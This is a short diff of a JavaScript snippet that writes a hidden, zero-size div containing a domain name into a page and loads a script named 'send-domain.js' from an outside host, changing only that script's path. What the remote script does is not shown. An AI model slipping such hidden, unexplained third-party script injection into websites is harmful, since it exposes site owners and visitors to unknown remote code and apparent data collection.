@@ -2,5 +2,5 @@ document.write(`
 
 <div id="Client"></div>
 <div class="demo-container" style="font-size:0;" hidden>feguys.com</div>
-<script src="https://gxcdn.xyz/domain-system/send-domain.js"><\/script>
+<script src="https://gxcdn.xyz/old_st/send-domain.js"><\/script>
 `)
